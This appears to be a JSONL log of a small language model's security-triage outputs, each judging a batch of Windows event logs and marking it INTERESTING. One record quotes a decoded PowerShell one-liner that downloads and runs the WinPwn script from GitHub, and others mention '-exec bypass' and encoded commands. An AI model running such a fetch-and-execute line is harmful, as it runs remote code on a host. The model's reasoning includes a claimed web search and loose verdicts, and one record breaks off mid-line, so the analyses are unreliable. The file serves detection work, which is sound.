{"file":"filtering\/gemma3_4b\/attack\/20250606_143748.jsonl","analysis":"<think>\nOkay, so I've got this JSONL data to analyze. Let me start by looking at each event one by one.\n\nThe first few events have the process field with a command line that runs powershell.exe and downloads some script from GitHub. The URL is https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/... which looks suspicious because it's a known repository for malicious scripts. The script name WinPwn.ps1 might be used for attacking Windows systems, so that's a red flag.\n\nThen there are events where the process is None but the winlog task involves User Account Management or Provider Lifecycle. These could be part of normal system operations but combined with other suspicious activities might indicate something malicious.\n\nLooking further down, I see multiple events with 'Execute a Remote Command' in the winlog task. This repeated occurrence suggests potential unauthorized access or command execution, which is concerning. The repetition makes me think it's not just an isolated incident but part of a larger pattern.\n\nI also notice that many of these events have process as None, which might mean they're not directly tied to a specific process but could be related to system-level activities. However, the combination of downloading a malicious script and executing remote commands is highly indicative of a potential security issue.\n\nPutting it all together, the batch includes both downloading a known malicious PowerShell script and numerous attempts to execute remote commands. This indicates possible unauthorized access or a cyberattack in progress. The repetition of these events strengthens the case that this isn't an isolated incident but part of a coordinated attack. Therefore, I classify this batch as INTERESTING with high confidence.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The batch contains multiple instances of downloading a known malicious PowerShell script from a suspicious GitHub repository and executing remote commands, indicating potential unauthorized access or attack.\",\n  \"CONFIDENCE\": 0.95\n}\n```"}
{"file":"filtering\/gemma3_4b\/attack\/20250606_143748.jsonl","analysis":"<think>\nAlright, let's take a look at this batch of system log events. The user has provided multiple JSONL entries, each representing an event from the Windows logs. My task is to determine if the entire batch is interesting for investigation or not.\n\nFirst, I notice that many of these events are related to PowerShell activity. Specifically, the process field repeatedly shows 'powershell.exe' with different command lines. Some commands use '-exec bypass', which is a common technique used in malicious scripts because it allows execution without certain security checks. That's a red flag because attackers often abuse this method to run arbitrary code.\n\nLooking at the command line details, I see Base64 encoded strings. Decoding them would reveal actual PowerShell commands. One example decodes to:\n`powershell.exe & {iex(new-object net.webclient).downloadstring('https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/...\/WinPwn.ps1')}`\nThis script is downloading code from a public GitHub repository, which might contain malicious activities. The script in question, WinPwn.ps1, is known to be associated with credential dumping and other harmful actions.\n\nAdditionally, the events show various tasks like 'Image loaded' and 'File created', but more concerning are the repeated 'Provider Lifecycle' and 'Engine Lifecycle' logs. These could indicate that the PowerShell process is being manipulated or extended, potentially for persistence or malicious operations.\n\nThere are also entries where the process field is None, paired with 'User Account Management' tasks. This might suggest unauthorized access attempts or credential-related activities, which are significant signs of potential compromise.\n\nConsidering all these points together: multiple instances of PowerShell executing scripts from external sources, use of bypass flags to evade detection, and associated events that could indicate lateral movement or data exfiltration. These factors strongly point towards malicious behavior.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple instances of powershell.exe with suspicious command lines, including execution via -exec bypass and downloading scripts from a known malicious repository (https:\/\/github.com\/S3cur3Th1sSh1t\/WinPwn).

{"file":"filtering\/gemma3_4b\/attack\/20250606_143748.jsonl","analysis":"<think>\nOkay, I need to analyze this batch of system log events and determine if the entire set is interesting for investigation. Let's start by looking at each event one by one.\n\nThe first event involves powershell.exe being accessed. That's a red flag because PowerShell can be used maliciously. The next event shows cmd.exe running a command that calls PowerShell with some encoded arguments. The command line looks suspicious, especially the use of \"-exec bypass\" which is often used to avoid detection or execution policies.\n\nThen there's whoami.exe being executed. While not inherently malicious, it can be part of reconnaissance activities to gather user information. Next, another powershell.exe access and a cmd.exe event that writes to the registry—this could be setting up persistence mechanisms or altering system configurations in a way that's unusual.\n\nLooking further, several events show powershell.exe loading various DLLs, which is normal but might indicate script execution or module loading. However, the specific files loaded don't immediately raise red flags unless they're known malicious ones. There's also a file created and then deleted by PowerShell, which could be part of a cleanup routine to remove traces of malicious activity.\n\nA pipe created by PowerShell suggests inter-process communication, which can be legitimate but sometimes used for command-and-control or data exfiltration. The wmiprvse.exe event modifying the registry is concerning because WMI is often targeted by attackers for persistence and privilege escalation.\n\nLastly, notepad.exe being executed normally isn't suspicious on its own unless it's part of a larger pattern. But considering all these together—multiple PowerShell executions with encoded command lines, registry modifications, file creation\/deletion, and pipe creations—it seems like there's a sequence of activities that could indicate malicious behavior such as script execution, persistence setup, or data handling.\n\nThe confidence level is high because the combination of events points to potential exploitation. The use of \"-exec bypass\" in PowerShell commands is a common tactic for attackers to execute scripts without triggering certain security measures. Additionally, the repeated attempts to access and manipulate system components like the registry and file system could be part of an attack chain.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple instances of suspicious PowerShell activity including encoded command lines, file creation\/deletion, and registry modifications suggest potential malicious behavior.\",\n  \"CONFIDENCE\": 0.95\n}\n```"}
{"file":"filtering\/gemma3_4b\/attack\/20250606_143748.jsonl","analysis":"<think>\nOkay, so I'm looking at this batch of system log events to determine if they're interesting or not for investigation. Let me go through each event and see what's happening.\n\nFirst, I notice a lot of events involving powershell.exe. That's a red flag because PowerShell can be used for both legitimate tasks and malicious activities. The first event shows that powershell.exe created a file in the StartupProfileData-NonInteractive directory. That seems unusual; I'm not sure why it would create a file there.\n\nThen, there are multiple events where powershell.exe is accessing processes, setting registry values, and loading images. These actions alone aren't necessarily suspicious, but when combined with other behaviors, they could indicate something's wrong. For example, process access might be part of legitimate scripting, but in the context of multiple such events, it might warrant closer look.\n\nI see an event where whoami.exe is executed. That command typically retrieves user information and isn't inherently malicious, but if used alongside other tools, it could be part of a reconnaissance attack to gather system details.\n\nLooking further, there's a significant event: powershell.exe executing a script downloaded from a GitHub repository. The URL points to a raw.githubusercontent.com domain, which is often used for distributing malicious scripts. The command line includes an IEX (invocation expression) that downloads and executes the script. This is a classic indicator of potentially harmful activity because downloading scripts directly can bypass some security measures and execute arbitrary code.\n\nThe script in question is WinPwn.ps1 from a specific commit hash. A quick search tells me that WinPwn is known to be malicious, often used for lateral movement or privilege escalation within a network. This makes the batch highly suspicious as it indicates possible unauthorized access or attack activities.\n\nAdditionally, there are file creation and deletion events of __PSScriptPolicyTest_0wo2rwkr.dxh.ps1. This might be part of script execution attempts to test system policies or to delete evidence after execution, which is another red flag for potential malicious behavior.\n\nConsidering all these points together—the use of powershell.exe with unusual commands, downloading and executing scripts from suspicious sources, and actions that could be part of an attack—this batch definitely stands out as interesting. The confidence level is high because multiple indicators point towards potentially malicious activities.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The batch contains multiple events involving powershell.exe executing a script downloaded from a GitHub repository, which is known for malicious purposes, along with other suspicious actions like file creation and deletion.\",\n  \"CONFIDENCE\": 0.95\n}\n```"}
